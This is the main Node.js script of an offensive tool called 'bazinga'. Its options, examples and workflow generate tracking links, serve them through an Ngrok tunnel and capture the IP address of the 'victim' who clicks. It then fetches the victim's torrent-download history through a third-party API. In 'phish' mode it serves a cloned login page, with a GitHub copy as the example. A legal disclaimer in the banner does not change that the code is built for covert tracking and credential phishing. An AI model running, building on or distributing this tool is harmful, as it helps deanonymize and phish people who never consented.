#!/usr/bin/env node
const CONFIG = require('./config/options');
const lstn = require('./listener');
const token = require('./token');
const tunnel = require ('./tunnel');
const fileOps = require ('./fileOperations');

const {argv} = require('yargs')
	.usage('Usage: node bz [options]')
	.usage('Usage: node bz [options]')
	.alias('help', 'h')

	.option('generator', {
		type: 'number',
		describe: 'No. of unique tokens to generate.',
		default: 0,
	})

	.option('mode', {
		type: 'string',
		describe: 'For IP Capture and Info gather: mode=info\nFor Phishing: mode=phish',
		default: CONFIG.OPTIONS.MODE,
	})

	.option('listener', {
		type: 'boolean', 
		describe: 'Start server to capture incoming requests.',
		default: CONFIG.OPTIONS.LISTENER,
	})

	.option('redirect-url', {
		type: 'string',
		describe: 'URL to redirect the victim after capturing IP',
		default: CONFIG.REDIRECT.REDIRECT_URL,
	})

	.option('local-url', {
		type: 'string',
		describe: 'Phishing page to serve the victim. To be used with mode=phish',
		default: CONFIG.REDIRECT.LOCAL_URL,
	})

	.option('port', {
		type: 'number',
		describe: 'port address to bind proxy server',
		default: CONFIG.REDIRECT.LISTENER_PORT,
	})

	.option('token-len', {
		type: 'number',
		describe: 'Length of token to be generated',
		default: CONFIG.OPTIONS.TOKEN_LEN,
	})

    .example("node $0 --generator=1 --mode=info --token-len=32 --port 8080")
    .example("node $0 --generator=2 --mode=phish --local-url=/sites/github/index.html")
    .example("node $0 --generator 3 --mode info --redirect-url 'https://www.reddit.com'")
    .example("node $0 --generator 4 --mode info --listener")
    .example("node $0 --listener ");

function printBanner(){
	console.log('\n\n' +
	'		      ____                  _                         		\n'+
	'		     |  _ \\                (_)                        	\n'+
	'		     | |_) |   __ _   ____  _   _ __     __ _    __ _ 		\n'+
	'		     |  _ <   / _` | |_  / | | | \'_ \\   / _` |  / _` |	\n'+
	'		     | |_) | | (_| |  / /  | | | | | | | (_| | | (_| |		\n'+
	'		     |____/   \\__,_| /___| |_| |_| |_|  \\__, |  \\__,_|	\n'+
	'		                                         __/ |        		\n'+
	'		                                        |___/         		\n'+
	'				    						'+
	'\n.........................................................................................................'+
	'\n||	LEGAL DISCLAIMER: This tool is to be used for educational purposes only.                       ||'+
	'\n||   Usage of bazinga for attacking targets without prior mutual consent is illegal.                   ||'+ 
	'\n||   It is the end user responsibility to obey all applicable local, state and federal laws.           ||'+ 
	'\n||   Developers assume no liability for any misuse or damage caused by this program                    ||'+
	'\n||.....................................................................................................||\n\n'
	);
}


function delete_session_tokens_and_links(cleanup){
	token.deleteAllTokens(function delete_tokens_callback(tokens_deleted){
		//delete all session.json tokens and clean file links.txt if listener==true			
		console.log("\nInfo:All tokens deleted from session file because CONFIG.OPTIONS.DELETE_ON_EXIT=true");
		console.log("Info:Keep this option true because links become useless as different sub-domain is assigned for every new Ngrok tunnel!");
		fileOps.deleteFileContent(function file_delete_callback(file_links_deleted){
			console.log("Info: All links deleted from link.txt");
			if(file_links_deleted && tokens_deleted) cleanup(1);
			else{ 
				console.log("Error:Error while deleting tokens and links") ;
				cleanup(2);
			}
		});	
	});		

}

function generate_and_store_tokens(generated_and_stored){
	console.log("Info:Please be patient storing tokens in session file...");			
	token.generateMultipleTokens(argv,function(token_arr){
		token.storeMultipleTokens(token_arr,argv,function stored(result){
			if(result){
				console.log(`Info:Tokens Stored in ${__dirname}/session.json`); 
				console.log(`Info:Links will appear in file ${__dirname}/links.txt when tunnel starts!`);
				generated_and_stored(1);
			}						
		});
	});
}

function start_tunnel_and_create_links(ngrok_listening){
	tunnel.startTunnel(argv,function tunnel_url(ngrok_url){
		lstn.listener(argv.port,ngrok_url);
		console.log(`Info:Local sever listening tunnel requests at ${argv.port}`);	
		console.log("Info:Your Ngrok URL is:",ngrok_url);

		//save to links.txt		
		fileOps.writeToFile(ngrok_url,function file_write_callback(written){
			console.log("Info:Please wait Writing to links.txt file...");
			if(written===1){
			console.log(`Info:Done! Now open ${__dirname}/links.txt and share links wherever you like.\nPress Ctrl+c to exit...`);
			ngrok_listening(1);
			}
		});
	});
}


async function exitHandler(options, exitCode) {
	if (options.close && argv.listener && CONFIG.OPTIONS.DELETE_ON_EXIT){
		delete_session_tokens_and_links(function cleanup(rslt){
			argv.listener=0;
			if(rslt) process.exit();
		});
	}
	
	if (options.close && !argv.listener){
		process.exit();
	}
	
	
	if (options.exit){
		console.log("\nBye!");
		process.exit();
	}
	
	if (options.exception){
		console.log("\nError:Oops Some exception has occured. Exiting...");
		process.exit();
	}
}


function main(){
	printBanner();

	if(CONFIG.API.KEY===""){
		console.log("Error:Api Key empty. Victim IP details will not be fetched!");
		console.log("Error:First get an API key at: https://iknowwhatyoudownload.com/en/api/");
		console.log(`Error:After that save it to ${__dirname}/config/options.js in the KEY field of API`);
	}

	
	if(argv.generator && argv.listener){
		generate_and_store_tokens(function generated_and_stored(all_done){
			start_tunnel_and_create_links(function ngrok_listening(lstn_result){});
		});
	}

	if(argv.listener && !argv.generator){
		start_tunnel_and_create_links(function ngrok_listening(lstn_result){});
	}

	if(argv.generator && !argv.listener){
		generate_and_store_tokens(function generated_and_stored(all_done){
			process.exit();
		});
	}
				
	//https://stackoverflow.com/questions/14031763/doing-a-cleanup-action-just-before-node-js-exits
	//do something when app is closing
	process.on('exit', exitHandler.bind(null,{exit:true}));
	
	//catches ctrl+c event
	process.on('SIGINT', exitHandler.bind(null,{close:true}));

	//catches uncaught exceptions (comment it if wanna see errors)
	//process.on('uncaughtException', exitHandler.bind(null,{exception:true}));	
	
}

main();
